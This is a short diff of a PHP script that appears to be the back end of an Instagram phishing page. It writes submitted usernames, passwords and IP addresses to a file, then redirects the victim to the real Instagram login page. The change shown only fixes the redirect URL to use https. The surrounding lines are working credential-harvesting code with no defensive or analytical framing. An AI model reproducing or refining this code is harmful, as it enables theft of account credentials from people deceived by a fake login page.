@@ -10,7 +10,7 @@ $yaz="Username:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n";
 fwrite ( $dosya , $yaz ) ;
 fclose ($dosya);
 
-header("Location: www.instagram.com/accounts/login");
+header("Location: https://www.instagram.com/accounts/login");
 die();
 
  ?>
